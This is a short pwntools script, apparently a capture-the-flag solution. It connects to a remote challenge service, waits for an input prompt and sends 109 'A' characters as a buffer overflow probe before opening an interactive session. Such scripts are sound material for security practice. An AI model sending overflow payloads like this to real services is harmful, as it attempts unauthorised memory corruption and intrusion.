from pwn import *

host = "forever.isss.io"
port = 1302

p = remote(host, port)



response = p.recvuntil("input!")
print(response.decode())
p.sendline("A" * 109)
p.interactive()
